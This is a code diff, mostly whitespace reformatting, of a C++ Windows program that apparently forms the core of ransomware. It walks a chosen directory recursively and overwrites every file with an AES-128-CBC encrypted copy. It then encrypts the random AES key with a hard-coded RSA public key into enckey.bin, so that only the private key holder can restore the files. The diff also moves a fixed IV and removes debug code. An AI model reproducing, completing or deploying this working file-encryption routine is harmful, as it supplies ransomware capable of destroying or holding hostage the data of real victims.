@@ -18,10 +18,6 @@ enum ReturnCode { SUCCESS = 0, FAILED = 1 };
 constexpr int KEY_LENGTH = 16;
 constexpr int IV_LENGTH = 16;
 
-std::array<BYTE, IV_LENGTH> IV = { 0x00, 0x01, 0x02, 0x03,
-								   0x04, 0x05, 0x06, 0x07,
-								   0x08, 0x09, 0x0A, 0x0B,
-								   0x0C, 0x0D, 0x0E, 0x0F };
 // Public key of RSA algorithm.
  BYTE PublicKey[] = {
 		0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x80, 0x00,
@@ -43,7 +39,7 @@ ReturnCode getPathInput(std::string& path);
 
 // Recursively get all files in given directory path.
 ReturnCode getAllFilesFromPath(std::vector<std::string>& filesList,
-						const std::string path);
+			       const std::string path);
 
 ReturnCode generateRandomSymmetricKey(std::array<BYTE, KEY_LENGTH>& key);
 
@@ -52,56 +48,54 @@ ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg);
 
 // performs encryption for each file in files list using input AES key and initialization vector.
 ReturnCode encryptFiles(const std::vector<std::string>& filesList,
-				 std::array<BYTE, KEY_LENGTH>& aes128key,
-				 std::array<BYTE, IV_LENGTH>& aesIV);
+			std::array<BYTE, KEY_LENGTH>& aes128key,
+			std::array<BYTE, IV_LENGTH>& aesIV);
 
 // performs encryption of the symmetric key, saving it in "enckey.bin" file.
 ReturnCode encryptSymmetricKeyInFile(std::array<BYTE, KEY_LENGTH>& aes128key,
-							   const std::string& path,
-							   const std::string& encryptedKeyFileName);
+				     const std::string& path,
+				     const std::string& encryptedKeyFileName);
 
 int main() {
 
-	std::string						path; // input directory path. 
+	std::string			path; // input directory path. 
 
-	std::vector<std::string>		filesList; // all files in the input directory and its subdirectories.
+	std::vector<std::string>	filesList; // all files in the input directory and its subdirectories.
 
 	std::array<BYTE, KEY_LENGTH>	key = { 0 }; // AES symmetric key.
 
-	const std::string				encryptedKeyFileName = "enckey.bin"; // file name of encrypted symmetric key.
-
+	const std::string		encryptedKeyFileName = "enckey.bin"; // file name of encrypted symmetric key.
 	
+	std::array<BYTE, IV_LENGTH> IV = { 0x00, 0x01, 0x02, 0x03,
+				  	   0x04, 0x05, 0x06, 0x07,
+				   	   0x08, 0x09, 0x0A, 0x0B,
+				    	   0x0C, 0x0D, 0x0E, 0x0F }; // Can be changed to input IV.
 	
 	if  (ReturnCode::FAILED == getPathInput(path)) {
 		std::cerr << "<ERROR> Input path is not a directory.\n";
 		return ReturnCode::FAILED;
 	}
-	
 
 	if (ReturnCode::FAILED == getAllFilesFromPath(filesList, path)) {
 		std::cerr << "<ERROR> Cannot get files from path.\n";
 		return ReturnCode::FAILED;
 	}
 
-	// For random generated key.
 	if (ReturnCode::FAILED == generateRandomSymmetricKey(key)) {
 		std::cerr << "<ERROR> Failed to generate random AES symmetric key.\n";
 		return ReturnCode::FAILED;
 	}
 
-	// perform AES symmetric key encryption on all files.
 	if (ReturnCode::FAILED == encryptFiles(filesList, key, IV)) {
 		std::cerr << "<ERROR> Failed to encrypt files.\n";
 		return ReturnCode::FAILED;
 	} 
 
-	// perform RSA public key encryption on the AES symmetric key.
 	if (ReturnCode::FAILED == encryptSymmetricKeyInFile(key, path, encryptedKeyFileName)) {
 		std::cerr << "<ERROR> Failed to encrypt symmetric key in file.\n";
 		return ReturnCode::FAILED;
 	}
 
-	// set zeroes for key and iv in the memory.
 	SecureZeroMemory(key.data(), key.size());
 
 	return ReturnCode::SUCCESS;
@@ -119,19 +113,19 @@ ReturnCode getPathInput(std::string& path) {
 }
 
 ReturnCode getAllFilesFromPath(std::vector<std::string>& filesList,
-							   const std::string path) {
+			       const std::string path) {
 
-	std::string				currentFilePath; // the current file with its full path for storing in files list.
-	std::string				newPath = path + "\\*"; // adds suffix for all files under the chosen directory.
-	LPCSTR					convertedRootPath = newPath.c_str(); // convert of the path into LPCSTR.
-	LPCSTR					convertedCurrentFilePath; // represents the current file's full path.
-	WIN32_FIND_DATAA		data; // a struct for file's data.
-	HANDLE					hFind = FindFirstFileA(convertedRootPath, &data); // gets the first file in the given path.
+	std::string		currentFilePath; // the current file with its full path for storing in files list.
+	std::string		newPath = path + "\\*"; // adds suffix for all files under the chosen directory.
+	LPCSTR			convertedRootPath = newPath.c_str(); // convert of the path into LPCSTR.
+	LPCSTR			convertedCurrentFilePath; // represents the current file's full path.
+	WIN32_FIND_DATAA	data; // a struct for file's data.
+	HANDLE			hFind = FindFirstFileA(convertedRootPath, &data); // gets the first file in the given path.
 
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
 			if (strcmp(data.cFileName, ".") != 0 &&
-				strcmp(data.cFileName, "..") != 0) { // ignore current and previous direcories.
+			    strcmp(data.cFileName, "..") != 0) { // ignore current and previous direcories.
 
 				currentFilePath = path + "\\" + data.cFileName;
 
@@ -165,23 +159,23 @@ ReturnCode generateRandomSymmetricKey(std::array<BYTE, KEY_LENGTH>& key) {
 
 ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg) {
 
-	NTSTATUS			status = 0; // contains the status returned from WinAPI functions.
+	NTSTATUS	status = 0; // contains the status returned from WinAPI functions.
 
 	// get the AES algorithm handler.
 	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hAesAlg,
-														 BCRYPT_AES_ALGORITHM,
-														 NULL,
-														 0))) {
+							     BCRYPT_AES_ALGORITHM,
+							     NULL,
+							     0))) {
 		std::cerr << "<ERROR> Failed to open algorithm provider." << std::endl;
 		return ReturnCode::FAILED;
 	}
 
 	// sets the AES algorithm chaining mode to CBC.
 	if (!NT_SUCCESS(status = BCryptSetProperty(hAesAlg,
-											   BCRYPT_CHAINING_MODE,
-											   (PBYTE)BCRYPT_CHAIN_MODE_CBC,
-										   	   sizeof(BCRYPT_CHAIN_MODE_CBC),
-										   	   0))) {
+						   BCRYPT_CHAINING_MODE,
+						   (PBYTE)BCRYPT_CHAIN_MODE_CBC,
+						   sizeof(BCRYPT_CHAIN_MODE_CBC),
+						   0))) {
 		std::cerr << "<ERROR> Failed to set CBC chaining mode to AES algorithm.\n";
 		return ReturnCode::FAILED;
 	}
@@ -190,36 +184,36 @@ ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg) {
 }
 
 ReturnCode encryptFiles(const std::vector<std::string>& filesList,
-						std::array<BYTE, KEY_LENGTH>& aes128Key,
-						std::array<BYTE, IV_LENGTH>& aesIV) {
+			std::array<BYTE, KEY_LENGTH>& aes128Key,
+			std::array<BYTE, IV_LENGTH>& aesIV) {
 
 	BCRYPT_ALG_HANDLE   hAesAlg = NULL; // encryption algorithm handler.
 
 	BCRYPT_KEY_HANDLE   hKey = NULL; // key handler.
 
 	HANDLE              hFileRead = NULL, // read from file handler.
-						hFileWrite = NULL; // write to file handler.
+			    hFileWrite = NULL; // write to file handler.
 
 	NTSTATUS            status = 0; // returned status from WinAPI functions.
 
-	ReturnCode			returnCode = ReturnCode::SUCCESS;
+	ReturnCode	   returnCode = ReturnCode::SUCCESS;
 
 	PBYTE               pbCipherText = NULL,
-						pbPlainText = NULL,
-						pbKeyObject = NULL,
-						pbIV = NULL,
-						pbFileBuffer = NULL;
+			    pbPlainText = NULL,
+		  	    pbKeyObject = NULL,
+			    pbIV = NULL,
+			    pbFileBuffer = NULL;
 
 	LPCSTR              lpFileToEncrypt = NULL;
 
 	DWORD               cbCipherText = 0,
-						cbPlainText = 0,
-						cbData = 0,
-						cbKeyObject = 0,
-						cbBlockLen = 0,
-						dwNumOfBytesWritten = 0,
-						dwBytesRead = 0,
-						cbFileSize = 0;
+			    cbPlainText = 0,
+	     		    cbData = 0,
+			    cbKeyObject = 0,
+			    cbBlockLen = 0,
+			    dwNumOfBytesWritten = 0,
+		   	    dwBytesRead = 0,
+			    cbFileSize = 0;
 
 	LARGE_INTEGER       lFileSize = { 0 };
 
@@ -231,11 +225,11 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 	// get the key object length from AES algorithm into cbKeyObject.
 	if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg,
-											   BCRYPT_OBJECT_LENGTH,
-											   (PBYTE)&cbKeyObject,
-											   sizeof(DWORD),
-											   &cbData,
-											   0))) {
+						   BCRYPT_OBJECT_LENGTH,
+						   (PBYTE)&cbKeyObject,
+						   sizeof(DWORD),
+						   &cbData,
+						   0))) {
 		std::cerr << "<ERROR> Faild to get key object length.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
@@ -243,8 +237,8 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 	// allocates memory in the heap for the key object by cbKeyObject size.
 	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(),
-								   HEAP_ZERO_MEMORY,
-								   cbKeyObject);
+				       HEAP_ZERO_MEMORY,
+				       cbKeyObject);
 
 	if (NULL == pbKeyObject) {
 		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
@@ -254,11 +248,11 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 	// get the block length from AES algorithm into cbBlockLen.
 	if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg,
-											   BCRYPT_BLOCK_LENGTH,
-											   (PBYTE)&cbBlockLen,
-											   sizeof(DWORD),
-											   &cbData,
-											   0))) {
+						   BCRYPT_BLOCK_LENGTH,
+						   (PBYTE)&cbBlockLen,
+						   sizeof(DWORD),
+						   &cbData,
+						   0))) {
 		std::cerr << "<ERROR> Failed to get block length.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
@@ -273,8 +267,8 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 	// Allocate a buffer for the IV as the size of a block.
 	pbIV = (PBYTE)HeapAlloc(GetProcessHeap(),
-							HEAP_ZERO_MEMORY,
-							cbBlockLen);
+				HEAP_ZERO_MEMORY,
+				cbBlockLen);
 
 	if (NULL == pbIV) {
 		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
@@ -284,18 +278,18 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 	// copies the data from AesIV into pbIV.
 	memcpy_s(pbIV,
-			 cbBlockLen,
-			 aesIV.data(),
-			 aesIV.size());
+		 cbBlockLen,
+		 aesIV.data(),
+		 aesIV.size());
 
 	// Generate the key from supplied input key bytes.
 	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(hAesAlg,
-														&hKey,
-														pbKeyObject,
-														cbKeyObject,
-														(PBYTE)aes128Key.data(),
-														aes128Key.size(),
-														0))) {
+							    &hKey,
+							    pbKeyObject,
+							    cbKeyObject,
+							    (PBYTE)aes128Key.data(),
+							    aes128Key.size(),
+							    0))) {
 		std::cerr << "<ERROR> Faild to generate a symmetric key.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
@@ -307,12 +301,12 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 		lpFileToEncrypt = file.c_str(); // convert string to LPCSTR.
 
 		hFileRead = CreateFileA(lpFileToEncrypt,
-								GENERIC_READ,
-								0,
-								NULL,
-								OPEN_EXISTING,
-								FILE_ATTRIBUTE_NORMAL,
-								NULL);
+					GENERIC_READ,
+					0,
+					NULL,
+					OPEN_EXISTING,
+					FILE_ATTRIBUTE_NORMAL,
+					NULL);
 
 		if (hFileRead == INVALID_HANDLE_VALUE) {
 			std::cerr << "<ERROR> Failed to open file : " << file << "\n";
@@ -329,8 +323,8 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 		// creates a file buffer with the file size.
 		pbFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
-										HEAP_ZERO_MEMORY,
-										(SIZE_T)lFileSize.QuadPart);
+						HEAP_ZERO_MEMORY,
+						(SIZE_T)lFileSize.QuadPart);
 
 		if (pbFileBuffer == NULL) {
 			std::cerr << "<ERROR> Failed to allocate memory for file : " << file << "\n";
@@ -339,10 +333,10 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 		// reads the input file into the file buffer.
 		if (!ReadFile(hFileRead,
-					 pbFileBuffer,
-				 	 (DWORD)lFileSize.QuadPart,
-				 	 &dwBytesRead,
-					 NULL)) {
+			      pbFileBuffer,
+			      (DWORD)lFileSize.QuadPart,
+			      &dwBytesRead,
+			      NULL)) {
 			std::cerr << "<ERROR> Failed to read content of file : " << file << "\n";
 			continue;
 		}
@@ -354,8 +348,8 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 		// allocate memory in the heap for the plain text.
 		pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(),
-									   HEAP_ZERO_MEMORY,
-									   cbPlainText);
+					       HEAP_ZERO_MEMORY,
+					       cbPlainText);
 
 		if (NULL == pbPlainText) {
 			std::cerr << "<ERROR> Failed to allocate temporary memory for file : " << file << "\n";
@@ -364,29 +358,29 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 
 		// copies the file data into pbPlainText
 		memcpy_s(pbPlainText,
-				 cbPlainText,
-				 pbFileBuffer,
-				 dwBytesRead);
+			 cbPlainText,
+			 pbFileBuffer,
+			 dwBytesRead);
 
 		// Get the needed buffer size.
 		if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
-											   pbPlainText,
-											   cbPlainText,
-											   NULL,
-											   pbIV,
-											   cbBlockLen,
-											   NULL,
-											   0,
-											   &cbCipherText,
-											   BCRYPT_BLOCK_PADDING))) {
+						       pbPlainText,
+						       cbPlainText,
+						       NULL,
+						       pbIV,
+						       cbBlockLen,
+						       NULL,
+						       0,
+						       &cbCipherText,
+						       BCRYPT_BLOCK_PADDING))) {
 			std::cerr << "<ERROR> Failed to get the cipher buffer size for file : " << file << "\n";
 			continue;
 		}
 
 		// allocate memory in the heap for the encrypted data.
 		pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(),
-										HEAP_ZERO_MEMORY,
-										cbCipherText);
+						HEAP_ZERO_MEMORY,
+						cbCipherText);
 
 		if (NULL == pbCipherText) {
 			std::cerr << "<ERROR> Failed to allocate memory for cipher text for file : " << file << "\n";
@@ -396,26 +390,26 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 		// Use the key to encrypt the plaintext buffer.
 		// For block sized messages, block padding will add an extra block.
 		if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
-											   pbPlainText,
-											   cbPlainText,
-											   NULL,
-											   pbIV,
-											   cbBlockLen,
-											   pbCipherText,
-											   cbCipherText,
-											   &cbCipherText,
-											   BCRYPT_BLOCK_PADDING))) {
+						       pbPlainText,
+						       cbPlainText,
+						       NULL,
+						       pbIV,
+						       cbBlockLen,
+						       pbCipherText,
+						       cbCipherText,
+						       &cbCipherText,
+						       BCRYPT_BLOCK_PADDING))) {
 			std::cerr << "<ERROR> Failed to perform encryption for file : " << file << "\n";
 			continue;
 		}
 
 		hFileWrite = CreateFileA(lpFileToEncrypt,
-								 GENERIC_WRITE,
-								 0,
-								 NULL,
-								 CREATE_ALWAYS,
-								 FILE_ATTRIBUTE_NORMAL,
-								 NULL);
+					 GENERIC_WRITE,
+					 0,
+					 NULL,
+					 CREATE_ALWAYS,
+					 FILE_ATTRIBUTE_NORMAL,
+					 NULL);
 
 		if (hFileWrite == INVALID_HANDLE_VALUE) {
 			std::cerr << "<ERROR> Failed to open file : " << file << "\n";
@@ -425,10 +419,10 @@ ReturnCode encryptFiles(const std::vector<std::string>& filesList,
 		dwNumOfBytesWritten = 0; // initialize number of bytes written to file.
 
 		if (!WriteFile(hFileWrite,
-						pbCipherText,
-						cbCipherText,
-						&dwNumOfBytesWritten,
-						NULL)) {
+			       pbCipherText,
+			       cbCipherText,
+			       &dwNumOfBytesWritten,
+			       NULL)) {
 			std::cerr << "<ERROR> Failed to write content to file : " << file << "\n";
 			CloseHandle(hFileWrite);
 			continue;
@@ -473,69 +467,69 @@ Cleanup:
 }
 
 ReturnCode encryptSymmetricKeyInFile(std::array<BYTE, KEY_LENGTH>& aes128key,
-								     const std::string& path,
-								     const std::string& encryptedKeyFileName) {
+				     const std::string& path,
+				     const std::string& encryptedKeyFileName) {
 
-	BCRYPT_ALG_HANDLE		hRsaAlg = NULL;
+	BCRYPT_ALG_HANDLE	hRsaAlg = NULL;
 
-	BCRYPT_KEY_HANDLE		hKey = NULL;
+	BCRYPT_KEY_HANDLE	hKey = NULL;
 
-	HANDLE					hFileWrite = NULL;
+	HANDLE			hFileWrite = NULL;
 
-	NTSTATUS			    status = 0;
+	NTSTATUS		status = 0;
 
-	ReturnCode				returnCode = ReturnCode::SUCCESS;
+	ReturnCode		returnCode = ReturnCode::SUCCESS;
 
-	PBYTE	                pbEncryptedBuffer = NULL,
-							pbDecryptedBuffer = NULL;
+	PBYTE	               	pbEncryptedBuffer = NULL,
+				pbDecryptedBuffer = NULL;
 
-	DWORD				    cbEncryptedBuffer = 0,
-							cbDecryptedBuffer = 0,
-							dwNumOfBytesWritten = 0;
+	DWORD			cbEncryptedBuffer = 0,
+				cbDecryptedBuffer = 0,
+				dwNumOfBytesWritten = 0;
 
 
 	std::string encryptedSymmetricKeyPath = "";
 	encryptedSymmetricKeyPath = path + "\\" + encryptedKeyFileName;
 
 	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hRsaAlg,
-														 BCRYPT_RSA_ALGORITHM,
-														 NULL,
-													 	 0))) {
+							     BCRYPT_RSA_ALGORITHM,
+							     NULL,
+						 	     0))) {
 		std::cerr << "<ERROR> Failed to open algorithm provider.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
 	}
 
 	if (!NT_SUCCESS(status = BCryptImportKeyPair(hRsaAlg,
-												 NULL,
-												 BCRYPT_RSAPUBLIC_BLOB,
-												 &hKey,
-											 	 PublicKey,
-												 sizeof(PublicKey),
-												 BCRYPT_NO_KEY_VALIDATION))) {
+						     NULL,
+						     BCRYPT_RSAPUBLIC_BLOB,
+						     &hKey,
+					 	     PublicKey,
+						     sizeof(PublicKey),
+						     BCRYPT_NO_KEY_VALIDATION))) {
 		std::cerr << "<ERROR> Failed to import public key.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
 	}
 
 	if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
-										   aes128key.data(),
-										   KEY_LENGTH,
-									       NULL,
-										   NULL,
-										   0,
-										   NULL,
-										   0,
-										   &cbEncryptedBuffer,
-										   BCRYPT_PAD_PKCS1))) {
+					       aes128key.data(),
+					       KEY_LENGTH,
+					       NULL,
+					       NULL,
+					       0,
+					       NULL,
+					       0,
+					       &cbEncryptedBuffer,
+					       BCRYPT_PAD_PKCS1))) {
 		std::cerr << "<ERROR> Failed to encrypt the key.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
 	}
 
 	pbEncryptedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
-										 HEAP_ZERO_MEMORY,
-										 cbEncryptedBuffer);
+					     HEAP_ZERO_MEMORY,
+					     cbEncryptedBuffer);
 
 	if (pbEncryptedBuffer == NULL) {
 		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
@@ -544,48 +538,28 @@ ReturnCode encryptSymmetricKeyInFile(std::array<BYTE, KEY_LENGTH>& aes128key,
 	}
 
 	if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
-										   aes128key.data(),
-										   KEY_LENGTH,
-										   NULL,
-										   NULL,
-									 	   0,
-										   pbEncryptedBuffer,
-									 	   cbEncryptedBuffer,
-									 	   &cbEncryptedBuffer,
-										   BCRYPT_PAD_PKCS1))) {
+					       aes128key.data(),
+					       KEY_LENGTH,
+					       NULL,
+					       NULL,
+					       0,
+					       pbEncryptedBuffer,
+					       cbEncryptedBuffer,
+					       &cbEncryptedBuffer,
+					       BCRYPT_PAD_PKCS1))) {
 		std::cerr << "<ERROR> Failed to encrypt the symmetric key.\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
 	}
-
-	// FOR TEST
-	/*
-	for (DWORD i = 0; i < 16; i++) {
-		printf("%02X ", (aes128key)[i]);
-	}
-	std::cout << "\n\n &\n\n";
-
-	for (DWORD i = 0; i < cbEncryptedBuffer; i++) {
-		printf("%02X ", ((PBYTE)pbEncryptedBuffer)[i]);
-	}
-	std::cout << "\n\n\n size is : " << cbEncryptedBuffer << "\n\n\n";
-	*/
-
-	/*
-	if (hKey)
-		BCryptDestroyKey(hKey);
-	if (hRsaAlg)
-		BCryptCloseAlgorithmProvider(hRsaAlg, 0);
-	*/
-
+	
 	// Creates file in the path named enckey.bin
 	hFileWrite = CreateFileA(encryptedSymmetricKeyPath.c_str(),
-							 GENERIC_WRITE,
-							 0,
-						 	 NULL,
-							 CREATE_ALWAYS,
-					 		 FILE_ATTRIBUTE_NORMAL,
-							 NULL);
+				 GENERIC_WRITE,
+				 0,
+			 	 NULL,
+				 CREATE_ALWAYS,
+		 		 FILE_ATTRIBUTE_NORMAL,
+				 NULL);
 
 	if (hFileWrite == INVALID_HANDLE_VALUE) {
 		std::cerr << "<ERROR> Failed to open file in path : " << encryptedSymmetricKeyPath << "\n";
@@ -593,11 +567,11 @@ ReturnCode encryptSymmetricKeyInFile(std::array<BYTE, KEY_LENGTH>& aes128key,
 		goto Cleanup;
 	}
 
-	if (!WriteFile(hFileWrite, //seems like false alert
-				   pbEncryptedBuffer,
-			   	   cbEncryptedBuffer,
-				   &dwNumOfBytesWritten,
-				   NULL)) {
+	if (!WriteFile(hFileWrite,
+		       pbEncryptedBuffer,
+		       cbEncryptedBuffer,
+		       &dwNumOfBytesWritten,
+		       NULL)) {
 		std::cerr << "<ERROR> Failed to write content to file : " << encryptedSymmetricKeyPath << "\n";
 		returnCode = ReturnCode::FAILED;
 		goto Cleanup;
